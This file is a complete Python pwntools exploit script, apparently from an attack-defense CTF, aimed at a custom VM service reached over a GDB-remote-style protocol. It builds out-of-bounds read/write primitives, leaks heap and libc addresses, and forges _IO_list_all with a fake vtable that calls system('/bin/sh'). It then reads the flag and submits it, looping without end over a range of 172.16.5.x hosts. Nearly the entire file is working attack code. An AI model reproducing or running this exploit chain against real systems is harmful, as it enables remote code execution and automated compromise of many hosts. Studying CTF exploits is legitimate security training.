from pwn import *
from submit import *
from binascii import b2a_hex, a2b_hex

e = ELF('./server.libc')


def ia():
    p.interactive()


def att(s=None):
    if s:
        gdb.attach(p, s)
    else:
        gdb.attach(p)


def sl(data):
    p.sendline(str(data))


def se(data):
    p.send(str(data))


def ru(delim):
    data = p.recvuntil(delim, timeout=1)
    return data


def rl(len):
    data = p.recv(len)
    return data


def checksum(payload):
    cs = 0
    for i in range(1, len(payload) - 1):
        cs = (cs + ord(payload[i])) & 0xff

    return hex(cs)[2:]


def tocode(code):
    payload = "$"
    payload += code
    payload += "#"
    payload += checksum(payload)
    return payload


def allocfb(idx):
    payload = "Z"  # backup
    payload += "0," + hex(idx)[:2] + "," + hex(idx)[:2]
    sl(tocode(payload))


def freefb(idx):
    payload = "z"  # backup
    payload += "0," + hex(idx)[:2] + "," + hex(idx)[:2]
    sl(tocode(payload))


def copytomem(idx, len, content):
    payload = "M"  # backup
    payload += hex(idx)[2:] + "," + hex(len)[2:] + ":" + content

    sl(tocode(payload))


def prints(reg):
    payload = "p"  # backup
    payload += hex(reg)[2:]
    sl(tocode(payload))


def printall():
    payload = "g"  # backup
    sl(tocode(payload))


def c2m(off, content, l=None):
    if not l:
        l = len(content)

    payload = "M"
    payload += hex(off)[2:] + "," + hex(l)[2:] + ":" + content

    sl(tocode(payload))

    return len(content) / 2


def run():
    sl(tocode('C'))


def quit():
    return '15'


def read(reg, off):
    return '0a' + b2a_hex(chr(reg)) + b2a_hex(p32(off))


def write(reg, off):
    return '0b' + b2a_hex(chr(reg)) + b2a_hex(p32(off))


def sub(reg, num):
    return '44' + b2a_hex(chr(reg)) + b2a_hex(p32(num))


def mov(reg, data):
    if isinstance(data, str):
        return '43' + b2a_hex(chr(reg)) + b2a_hex(data)
    else:
        return '43' + b2a_hex(chr(reg)) + b2a_hex(p32(data))


def oobread(reg, off):
    payload = mov(15, off - 18 - cur)  # 6
    payload += write(15, 2)  # 6
    payload += read(reg, 0)  # 6
    return payload


def oobwrite1(off, data):
    payload = mov(15, off - 30 - cur)
    payload += mov(14, 0xa1)
    payload += sub(14, 0xa1 - data)
    payload += write(15, 2)  # self-modify
    payload += write(14, 0)
    return payload


def oobwrite(off, data):
    payload = mov(15, off - 24 - cur)
    payload += mov(14, data)
    payload += write(15, 2)  # self-modify
    payload += write(14, 0)
    return payload

debug = 0
while 1:
    for x in xrange(10,34):
        try:
            cur = 0
            if debug:
                p = process('./debug_vm', env={'LD_PRELOAD': './server.libc'})
                # p = process('./debug_vm')
                # e=ELF('/lib/x86_64-linux-gnu/libc.so.6')
            else:
                p = remote('172.16.5.{}'.format(x).format(x), 5050)

            for x in xrange(13):
                allocfb(x)

            freefb(0)
            freefb(2)

            cur += c2m(cur, oobread(0, 0x1030))
            cur += c2m(cur, oobread(1, 0x1034))
            c2m(cur, quit())
            run()
            printall()
            p.recvuntil('thread')
            p.recvuntil('#')
            p.recv(2)
            p.recvuntil('$')
            hl = u32(a2b_hex(p.recv(8)))
            hh = u32(a2b_hex(p.recv(8)))
            heap = hl | (hh << 32)
            p.recvuntil('#')
            p.recv(2)
            log.success('heap:' + hex(heap))

            allocfb(0)
            allocfb(2)

            cur += c2m(cur, oobwrite(0x1028, 0xa1))
            c2m(cur, quit())
            run()

            freefb(0)

            cur += c2m(cur, oobread(0, 0x1030))
            cur += c2m(cur, oobread(1, 0x1034))
            c2m(cur, quit())
            run()
            printall()
            p.recvuntil('thread')
            p.recvuntil('thread')
            p.recvuntil('#')
            p.recv(2)
            p.recvuntil('$')
            ll = u32(a2b_hex(p.recv(8)))
            lh = u32(a2b_hex(p.recv(8)))
            libc = ll | (lh << 32)
            libc -= 0x3c4b78
            #libc += 0x3020
            log.success('libc:' + hex(libc))
            system = libc + e.symbols['system']

            iolist = libc + e.symbols['_IO_list_all'] - 0x10
            cur += c2m(cur, oobwrite(0x1020, '/bin'))
            cur += c2m(cur, oobwrite(0x1024, '/sh\x00'))
            cur += c2m(cur, oobwrite1(0x1028, 0x61))
            cur += c2m(cur, oobwrite(0x1038, iolist & 0xffffffff))
            cur += c2m(cur, oobwrite(0x103c, iolist >> 32))
            c2m(cur, quit())
            run()
            cur += c2m(cur, oobwrite(0x10e0, heap & 0xffffffff))
            cur += c2m(cur, oobwrite(0x10e4, heap >> 32))

            c2m(cur, quit())
            run()
            vtable=heap+0x120
            # cur += c2m(cur, oobwrite(0x1100, 1))
            # cur += c2m(cur, oobwrite(0x1104, 0))
            # cur += c2m(cur, oobwrite(0x1108, 0))
            # cur += c2m(cur, oobwrite(0x110c, 0))
            # cur += c2m(cur, oobwrite(0x1110, 0))
            # cur += c2m(cur, oobwrite(0x1114, 0))
            cur += c2m(cur, oobwrite(0x10f8, vtable & 0xffffffff))
            cur += c2m(cur, oobwrite(0x10fc, vtable >> 32))
            c2m(cur, quit())
            run()

            cur += c2m(cur, oobwrite(0x1120, 1))
            cur += c2m(cur, oobwrite(0x1124, 0))
            cur += c2m(cur, oobwrite(0x1128, 2))

            c2m(cur, quit())
            run()
            cur += c2m(cur, oobwrite(0x112c, 0))
            cur += c2m(cur, oobwrite(0x1130, 3))
            cur += c2m(cur, oobwrite(0x1134, 0))
            c2m(cur, quit())
            run()
            cur += c2m(cur, oobwrite(0x1138, system & 0xffffffff))
            cur += c2m(cur, oobwrite(0x113c, system >> 32))
            c2m(cur, quit())
            run()

            cur += c2m(cur, oobwrite(0x10c0, heap & 0xffffffff))
            cur += c2m(cur, oobwrite(0x10c4, heap >> 32))
            c2m(cur, quit())
            run()
            #att('b *{}'.format(hex(libc+0x07C165)))
            allocfb(0)
            p.recvuntil('map:')
            p.recvuntil('\n')
            p.sendline('cat flag')
            flag=p.recvuntil('\n',drop=1)
            submit(flag)
            time.sleep(1)
            p.close()

        except:
            p.close()
            continue